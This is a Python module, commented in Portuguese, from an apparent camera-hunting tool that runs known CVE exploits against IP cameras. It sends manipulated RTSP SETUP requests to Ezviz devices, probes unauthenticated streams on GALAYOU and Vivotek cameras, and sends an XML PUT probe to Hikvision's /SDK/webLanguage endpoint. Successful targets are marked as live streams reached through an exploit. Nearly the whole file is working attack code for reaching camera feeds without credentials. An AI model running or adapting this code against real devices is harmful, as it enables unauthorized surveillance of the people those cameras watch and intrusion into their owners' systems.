"""
CVE Exploits do Procurador de Câmara (Técnica 7).

Implementa exploits conhecidos para câmaras IP (2021-2026):
- CVE-2021-36260 (Hikvision RCE) — POST /SDK/webLanguage
- CVE-2024-42531 (Ezviz) — RTSP redirect bypass
- CVE-2025-9983 (GALAYOU) — RTSP sem auth (já em scanner)
- CVE-2025-66049 (Vivotek) — RTSP porta 8554 sem auth (já em scanner)
- CVE-2025-65856 (Xiongmaitech) — ONVIF sem auth (já em onvif.py)

Uso:
    from procurador.core.cve import try_cve_exploit
    success = try_cve_exploit(camera)
"""

from __future__ import annotations

import logging

import requests

from procurador.core.models import (
    AccessMethod,
    Camera,
    CameraStatus,
)
from procurador.core.scanner import probe_rtsp

logger = logging.getLogger(__name__)


# =====================================================================
# CVE-2021-36260 — Hikvision RCE
# =====================================================================


def hikvision_rce(
    ip: str,
    port: int = 80,
    timeout: float = 5.0,
) -> dict | None:
    """Testa CVE-2021-36260 (Hikvision RCE via /SDK/webLanguage).

    Esta CVE permite RCE em Hikvision sem autenticação enviando um
    payload XML malicioso para /SDK/webLanguage. Não vamos executar
    RCE real — apenas detetar se o endpoint é vulnerável.

    Args:
        ip, port: Endereço HTTP.
        timeout: Timeout.

    Returns:
        Dict com {url, vulnerable, response} se o endpoint responder, None caso contrário.
    """
    url = f"http://{ip}:{port}/SDK/webLanguage"

    # Payload de deteção (não-executável — só verifica se endpoint aceita)
    detection_payload = """<?xml version="1.0" encoding="UTF-8"?>
<language>
<id>1</id>
<name>en</name>
<appPath></appPath>
<defaultLayer>0</defaultLayer>
<currentLayer>0</currentLayer>
</language>"""

    try:
        resp = requests.put(
            url,
            data=detection_payload,
            headers={"Content-Type": "application/xml; charset=utf-8"},
            timeout=timeout,
        )

        if resp.status_code == 200:
            # Se 200 OK sem auth, é vulnerável
            logger.warning(f"🔓 CVE-2021-36260 potencial em {ip}:{port}")
            return {
                "url": url,
                "vulnerable": True,
                "status": resp.status_code,
                "response": resp.text[:2048],
            }
    except requests.exceptions.RequestException as e:
        logger.debug(f"CVE-2021-36260 check {ip}:{port} err: {e}")

    return None


# =====================================================================
# CVE-2024-42531 — Ezviz RTSP redirect bypass
# =====================================================================


def ezviz_redirect_bypass(
    ip: str,
    port: int = 554,
    timeout: float = 5.0,
) -> bool:
    """Testa CVE-2024-42531 (Ezviz CS-CV246): RTSP redirect bypass.

    Algumas câmaras Ezviz podem ser acedidas via um SETUP RTSP com
    Transport header manipulado.

    Args:
        ip, port: RTSP.
        timeout: Timeout.

    Returns:
        True se a técnica funcionou (stream 200 OK).
    """
    # Tentar vários SETUP com transports manipulados
    for path in ("/Streaming/tracks/101", "/live/main", "/h264/ch1/main/av_stream"):
        for transport in (
            "RTP/AVP/TCP;interleaved=0-1",
            "RTP/AVP;unicast;client_port=1234-1235",
            "RTP/AVP/UDP;unicast;client_port=1234-1235",
        ):
            try:
                import socket

                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                sock.connect((ip, port))
                req = (
                    f"SETUP rtsp://{ip}:{port}{path} RTSP/1.0\r\n"
                    f"CSeq: 1\r\n"
                    f"Transport: {transport}\r\n"
                    f"User-Agent: Procurador/1.0\r\n"
                    "\r\n"
                )
                sock.sendall(req.encode("latin-1", errors="ignore"))
                data = b""
                while True:
                    try:
                        chunk = sock.recv(4096)
                    except TimeoutError:
                        break
                    if not chunk:
                        break
                    data += chunk
                    if b"\r\n\r\n" in data:
                        break
                sock.close()
                raw = data.decode("latin-1", errors="ignore")
                if "RTSP/1.0 200" in raw:
                    logger.info(f"🔓 CVE-2024-42531 bypass: {ip}:{port}{path}")
                    return True
            except Exception as e:
                logger.debug(f"ezviz bypass err: {e}")
                continue
    return False


# =====================================================================
# CVE-2025-9983 — GALAYOU (proxy)
# =====================================================================


def galayou_bypass(camera: Camera) -> bool:
    """Testa CVE-2025-9983 (GALAYOU G2): RTSP sem auth sempre responde 200.

    Já implementado em scanner.probe_rtsp_no_auth. Esta função é um
    wrapper para integração no pipeline CVE.

    Args:
        camera: Camera (deve ter port 554 e path /live/ch00_0).

    Returns:
        True se vulnerável.
    """
    probe = probe_rtsp(camera.ip, camera.port, "/live/ch00_0", timeout=3.0)
    if probe and probe.status_code == 200:
        camera.cve_exploited = "CVE-2025-9983"
        camera.tags.append("CVE-2025-9983")
        return True
    return False


# =====================================================================
# CVE-2025-66049 — Vivotek (proxy)
# =====================================================================


def vivotek_bypass(camera: Camera) -> bool:
    """Testa CVE-2025-66049 (Vivotek IP7137): RTSP porta 8554 sem auth.

    Args:
        camera: Camera.

    Returns:
        True se vulnerável.
    """
    probe = probe_rtsp(camera.ip, 8554, "/live.sdp", timeout=3.0)
    if probe and probe.status_code == 200:
        camera.cve_exploited = "CVE-2025-66049"
        camera.tags.append("CVE-2025-66049")
        # Atualizar porta
        camera.port = 8554
        camera.rtsp_path = "/live.sdp"
        camera.rtsp_url = f"rtsp://{camera.ip}:8554/live.sdp"
        return True
    return False


# =====================================================================
# Dispatcher
# =====================================================================


def try_cve_exploit(camera: Camera) -> bool:
    """Tenta exploits CVE baseado no fabricante da câmara.

    Args:
        camera: Camera (vendor já identificado).

    Returns:
        True se algum exploit teve sucesso e a câmara foi marcada como LIVE.
    """
    if camera.status == CameraStatus.LIVE:
        return False

    vendor = (camera.vendor or "").lower()

    # GALAYOU
    if "galayou" in vendor:
        if galayou_bypass(camera):
            camera.status = CameraStatus.LIVE
            camera.auth_required = False
            camera.auth_success = True
            camera.access_method = AccessMethod.CVE_EXPLOIT
            camera.tags.append("CVE-2025-9983")
            return True

    # Vivotek
    if "vivotek" in vendor:
        if vivotek_bypass(camera):
            camera.status = CameraStatus.LIVE
            camera.auth_required = False
            camera.auth_success = True
            camera.access_method = AccessMethod.CVE_EXPLOIT
            camera.tags.append("CVE-2025-66049")
            return True

    # Hikvision
    if "hikvision" in vendor:
        # Testar RCE detection (não execução)
        for port in (80, 443, 8080, 8000):
            rce = hikvision_rce(camera.ip, port=port, timeout=3.0)
            if rce:
                camera.cve_exploited = "CVE-2021-36260"
                camera.tags.append("CVE-2021-36260")
                logger.warning(
                    f"⚠️  Hikvision {camera.ip}:{port} responde a CVE-2021-36260 (não executar RCE!)"
                )
                # Não marcamos como LIVE — isto é deteção, não exploit
                break

    # Ezviz
    if "ezviz" in vendor:
        if ezviz_redirect_bypass(camera.ip, camera.port, timeout=3.0):
            camera.cve_exploited = "CVE-2024-42531"
            camera.tags.append("CVE-2024-42531")
            # Marcar como LIVE no path correto
            camera.rtsp_path = "/Streaming/tracks/101"
            camera.rtsp_url = f"rtsp://{camera.ip}:{camera.port}/Streaming/tracks/101"
            camera.status = CameraStatus.LIVE
            camera.auth_required = False
            camera.auth_success = True
            camera.access_method = AccessMethod.CVE_EXPLOIT
            return True

    return False
